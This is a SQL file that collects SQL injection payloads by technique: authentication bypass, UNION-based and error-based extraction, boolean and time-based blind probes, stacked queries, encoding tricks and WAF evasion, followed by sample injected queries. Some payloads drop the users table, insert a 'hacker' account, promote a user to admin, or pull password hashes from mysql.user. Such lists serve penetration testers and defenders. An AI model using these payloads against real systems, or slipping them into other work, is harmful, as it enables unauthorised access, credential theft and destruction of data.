-- SQL Injection Testing Payloads
-- Collection of common SQL injection test strings

-- ==========================================
-- AUTHENTICATION BYPASS PAYLOADS
-- ==========================================
-- admin' --
-- admin' #
-- admin'/*
-- ' or 1=1--
-- ' or 1=1#
-- ' or 1=1/*
-- ') or '1'='1--
-- ') or ('1'='1--
-- ' OR '1'='1
-- ' OR 1=1--
-- ' OR ''='
-- admin' or '1'='1
-- admin' or 1=1--
-- admin') or ('1'='1
-- admin') or '1'='1'--

-- ==========================================
-- UNION-BASED PAYLOADS
-- ==========================================
-- ' UNION SELECT NULL--
-- ' UNION SELECT NULL,NULL--
-- ' UNION SELECT NULL,NULL,NULL--
-- ' UNION SELECT username,password FROM users--
-- ' UNION ALL SELECT NULL,NULL,NULL--
-- 1' UNION SELECT table_name,NULL FROM information_schema.tables--
-- 1' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'--

-- ==========================================
-- ERROR-BASED PAYLOADS
-- ==========================================
-- ' AND 1=CONVERT(int, (SELECT @@version))--
-- ' AND 1=CAST((SELECT TOP 1 username FROM users) AS int)--
-- ' AND extractvalue(1,concat(0x7e,database()))--
-- ' AND updatexml(1,concat(0x7e,version()),1)--

-- ==========================================
-- BOOLEAN-BASED BLIND PAYLOADS
-- ==========================================
-- ' AND 1=1--
-- ' AND 1=2--
-- ' AND 'a'='a
-- ' AND 'a'='b
-- 1' AND '1'='1
-- 1' AND '1'='2

-- ==========================================
-- TIME-BASED BLIND PAYLOADS
-- ==========================================
-- MySQL/MariaDB:
-- ' AND SLEEP(5)--
-- 1' AND SLEEP(5)--
-- ' OR SLEEP(5)--
-- 1' OR IF(1=1,SLEEP(5),0)--

-- PostgreSQL:
-- '; SELECT pg_sleep(5)--
-- 1'; SELECT pg_sleep(5)--

-- Microsoft SQL Server:
-- '; WAITFOR DELAY '00:00:05'--
-- 1'; WAITFOR DELAY '00:00:05'--

-- ==========================================
-- STACKED QUERIES PAYLOADS
-- ==========================================
-- '; DROP TABLE users--
-- '; INSERT INTO users VALUES ('hacker','password')--
-- '; UPDATE users SET role='admin' WHERE username='normaluser'--
-- '; CREATE TABLE temp (data VARCHAR(100))--

-- ==========================================
-- COMMENT VARIATIONS
-- ==========================================
-- MySQL/MariaDB:
-- admin'-- 
-- admin'#
-- admin'/*
-- admin'-- -

-- Microsoft SQL Server:
-- admin'--
-- admin'/**/

-- PostgreSQL:
-- admin'--

-- ==========================================
-- ENCODING BYPASSES
-- ==========================================
-- URL Encoded:
-- %27%20OR%201=1--
-- %27%20UNION%20SELECT%20NULL--

-- Double URL Encoded:
-- %2527%2520OR%25201=1--

-- Hex Encoded:
-- 0x61646D696E (admin)
-- SELECT * FROM users WHERE username = 0x61646D696E

-- ==========================================
-- WAF BYPASS TECHNIQUES
-- ==========================================
-- Using inline comments:
-- '/**/OR/**/1=1--
-- SELECT/**/username/**/FROM/**/users

-- Case variations:
-- ' Or 1=1--
-- ' oR 1=1--
-- ' UnIoN sElEcT--

-- Alternative spacing:
-- '%09OR%091=1--  (tab)
-- '%0aOR%0a1=1--  (newline)

-- Alternative quotes:
-- " OR 1=1--
-- ` OR 1=1--

-- ==========================================
-- REAL-WORLD TEST CASES
-- ==========================================

-- Test 1: Login bypass
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '';

-- Test 2: Data extraction
SELECT * FROM users WHERE id = 1 UNION SELECT table_name, NULL, NULL, NULL FROM information_schema.tables;

-- Test 3: Blind injection verification
SELECT * FROM users WHERE username = 'test' AND 1=1;
SELECT * FROM users WHERE username = 'test' AND 1=2;

-- Test 4: Time delay check
SELECT * FROM users WHERE username = 'admin' AND SLEEP(5);

-- Test 5: Error generation
SELECT * FROM users WHERE id = 'abc';

-- Test 6: Schema discovery
SELECT table_name FROM information_schema.tables WHERE table_schema = 'security_test';

-- Test 7: Privilege check
SELECT user, host, authentication_string FROM mysql.user;
